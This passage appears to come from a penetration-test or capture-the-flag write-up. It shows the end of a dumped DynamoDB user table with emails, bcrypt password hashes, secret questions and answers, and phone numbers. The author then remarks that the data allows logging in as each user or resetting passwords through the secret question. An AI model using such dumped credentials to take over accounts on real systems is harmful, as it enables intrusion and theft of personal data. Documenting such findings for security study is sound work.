                "S": "tempus.risus@aol.net"
            },
            "country": {
                "S": "India"
            },
            "name": {
                "S": "Dimitry Levy"
            },
            "authLevel": {
                "S": "100"
            },
            "password": {
                "S": "$2a$10$CSXpoeXZDCxXLrhWh.zmD.cM9UgNAoc0fADmUCgEe0lGH4FyXP6be"
            },
            "username": {
                "S": "dimitrylevy"
            },
            "id": {
                "S": "4"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "0227915835"
            }
        },
        {
            "secretQuestion": {
                "S": "What is your favourite sport?"
            },
            "creationDate": {
                "S": "2022-01-25T00:00:00.000Z"
            },
            "address": {
                "S": "Ap #662-2304 Phasellus Ave"
            },
            "secretAnswer": {
                "S": "Football"
            },
            "email": {
                "S": "dolor.fusce@aol.ca"
            },
            "country": {
                "S": "Germany"
            },
            "name": {
                "S": "Naida Dotson"
            },
            "authLevel": {
                "S": "0"
            },
            "password": {
                "S": "$2a$10$ru0QWFM7BFe.e470jT1sz.iMGxjUOrXyyClc9301mcw.fEbcUk/Ta"
            },
            "username": {
                "S": "naidadotson"
            },
            "id": {
                "S": "1"
            },
            "userStatus": {
                "S": "active"
            },
            "phone": {
                "S": "329938731"
            }
        }
    ],
    "Count": 8,
    "ScannedCount": 8,
    "ConsumedCapacity": null
}
````
With this information we are able to login in each user, and in case we can't due to special characters, we can always reset the password with the secret question.
